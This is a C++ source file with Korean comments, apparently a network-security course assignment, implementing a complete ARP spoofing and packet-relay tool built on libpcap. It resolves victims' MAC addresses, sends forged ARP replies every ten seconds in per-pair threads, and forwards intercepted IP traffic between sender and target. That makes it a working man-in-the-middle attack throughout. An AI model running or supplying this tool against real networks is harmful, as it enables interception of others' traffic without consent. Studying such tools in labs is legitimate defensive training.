#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <vector>
#include <unordered_map>
#include <thread>
#include <chrono>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct IpPair {
    Ip sender;
    Ip target;
    Mac sender_mac;
    Mac target_mac;
};

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_interface_info(const char* interface, Mac& mac, Ip& ip) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    
    // Get MAC address
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) return false;
    mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

    // Get IP address
    if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) return false;
    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    ip = Ip(inet_ntoa(ipaddr->sin_addr));

	// printf("%s: %s, %s\n", interface, std::string(mac).c_str(), std::string(ip).c_str());
    close(fd);
    return true;
}

int send_arp(pcap_t* handle, Mac my_mac, Ip target_ip, Mac sender_mac, Ip sender_ip) {

    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return res;
}

Mac get_sender_mac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip sender_ip) {

    // printf("1\n");
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return Mac::nullMac();
    }

    while (true) {
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return Mac::nullMac();
        }
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* recv_packet = (EthArpPacket*)packet;
        if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp &&
            ntohs(recv_packet->arp_.op_) == ArpHdr::Reply &&
            Ip(recv_packet->arp_.sip()) == sender_ip) {
                return recv_packet->arp_.smac_;
        }
    }

    return Mac::nullMac();
}

// IP 체크섬 계산 함수 (필요한 경우)
// uint16_t calculate_checksum(uint16_t* addr, int len) {
//     long sum = 0;
//     while (len > 1) {
//         sum += *addr++;
//         len -= 2;
//     }
//     if (len == 1) {
//         sum += *(uint8_t*)addr;
//     }
//     sum = (sum >> 16) + (sum & 0xffff);
//     sum += (sum >> 16);
//     return (uint16_t)(~sum);
// }

int arp_relay(pcap_t* handle, Mac my_mac, Ip sender_ip, Ip target_ip, const std::unordered_map<Ip, Mac>& known_macs) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;  // 타임아웃
        if (res == -1 || res == -2) {
            pcap_perror(handle, "pcap_next_ex");
            break;  // 에러 또는 EOF
        }

        EthHdr* eth_hdr = (EthHdr*)packet;
        
        if (ntohs(eth_hdr->type_) == EthHdr::Ip4) {
            struct ipv4_header* ip_hdr = (struct ipv4_header*)(packet + sizeof(EthHdr));
            
            // IP 주소를 uint32_t로 변환
            uint32_t src_ip = (ip_hdr->src_ip[0] << 24) | (ip_hdr->src_ip[1] << 16) | 
                              (ip_hdr->src_ip[2] << 8)  | ip_hdr->src_ip[3];
            uint32_t dst_ip = (ip_hdr->dst_ip[0] << 24) | (ip_hdr->dst_ip[1] << 16) | 
                              (ip_hdr->dst_ip[2] << 8)  | ip_hdr->dst_ip[3];

            if (src_ip == sender_ip || src_ip == target_ip) {
                // 패킷의 출발지가 sender 또는 target일 때
                Mac dst_mac;
                if (src_ip == sender_ip) {
                    dst_mac = known_macs.at(target_ip);  // 목적지는 target의 MAC
                } else {
                    dst_mac = known_macs.at(sender_ip);  // 목적지는 sender의 MAC
                }

                // 패킷 수정 및 전송
                u_char* new_packet = new u_char[header->len];
                memcpy(new_packet, packet, header->len);
                EthHdr* new_eth_hdr = (EthHdr*)new_packet;

                new_eth_hdr->smac_ = my_mac;
                new_eth_hdr->dmac_ = dst_mac;

                // IP 체크섬 재계산 (필요한 경우)
                // struct ipv4_header* new_ip_hdr = (struct ipv4_header*)(new_packet + sizeof(EthHdr));
                // new_ip_hdr->checksum = 0;
                // new_ip_hdr->checksum = calculate_checksum((uint16_t*)new_ip_hdr, sizeof(struct ipv4_header));

                if (pcap_sendpacket(handle, new_packet, header->len) != 0) {
                    fprintf(stderr, "Failed to relay packet: %s\n", pcap_geterr(handle));
                }

                delete[] new_packet;
            }
        }
    }

    return 0;
}

void periodic_arp_spoof(pcap_t* handle, Mac my_mac, Ip target_ip, Mac sender_mac, Ip sender_ip) {
    while (true) {
        send_arp(handle, my_mac, target_ip, sender_mac, sender_ip);
        std::this_thread::sleep_for(std::chrono::seconds(10));  // 10초마다 ARP 스푸핑
    }
}

void arp_spoof_and_relay(pcap_t* handle, Mac my_mac, Ip sender_ip, Ip target_ip, 
                         const std::unordered_map<Ip, Mac>& known_macs) {
    // ARP 스푸핑 스레드 시작
    std::thread spoof_thread(periodic_arp_spoof, handle, my_mac, target_ip, 
                             known_macs.at(sender_ip), sender_ip);

    // 릴레이 수행
    arp_relay(handle, my_mac, sender_ip, target_ip, known_macs);

    spoof_thread.join(); // ARP 스푸핑 스레드 종료
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac my_mac;
    Ip my_ip;
    if (!get_interface_info(dev, my_mac, my_ip)) {
        fprintf(stderr, "couldn't get interface info for %s\n", dev);
        return -1;
    }

    std::vector<IpPair> ip_pairs;
    std::unordered_map<Ip, Mac> known_macs;

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i+1]);
        
        Mac sender_mac;
        if (known_macs.find(sender_ip) == known_macs.end()) {
            sender_mac = get_sender_mac(handle, my_mac, my_ip, sender_ip);
            if (sender_mac == Mac::nullMac()) {
                fprintf(stderr, "couldn't get sender's MAC address for %s\n", std::string(sender_ip).c_str());
                continue;
            }
            known_macs[sender_ip] = sender_mac;
        } else {
            sender_mac = known_macs[sender_ip];
        }

        Mac target_mac;
        if (known_macs.find(target_ip) == known_macs.end()) {
            target_mac = get_sender_mac(handle, my_mac, my_ip, target_ip);
            if (target_mac == Mac::nullMac()) {
                fprintf(stderr, "couldn't get sender's MAC address for %s\n", std::string(target_ip).c_str());
                continue;
            }
            known_macs[target_ip] = target_mac;
        } else {
            target_mac = known_macs[target_ip];
        }
        ip_pairs.push_back({sender_ip, target_ip, sender_mac, target_mac});
        send_arp(handle, my_mac, target_ip, sender_mac, sender_ip);
        // printf("Sent ARP reply to %s\n", std::string(sender_ip).c_str());
        // printf("Sent ARP reply to %s\n", std::string(sender_mac).c_str());
        send_arp(handle, my_mac, sender_ip, target_mac, target_ip);
        // printf("Sent ARP reply to %s\n", std::string(target_ip).c_str());
        // printf("Sent ARP reply to %s\n", std::string(target_mac).c_str());
    }

    if (ip_pairs.empty()) {
        fprintf(stderr, "No valid IP pairs provided. Exiting.\n");
        return -1;
    }

    std::vector<std::thread> threads;
    for (const auto& pair : ip_pairs) {
        // 각 IP 쌍에 대한 스레드 생성
        threads.emplace_back(arp_spoof_and_relay, handle, my_mac, pair.sender, pair.target, std::ref(known_macs));
    }   // std::ref를 사용하는 이유는 스레드에 맵의 복사본이 아닌 참조를 전달 -> 모든 스레드가 동일한 맵을 공유하여 메모리를 절약하고 일관성 유지 가능

    // 모든 스레드가 완료될 때까지 대기 (실제로는 무한 루프 때문에 여기에 도달하지 않음)
    for (auto& t : threads) {
        t.join();
    }

    pcap_close(handle);
}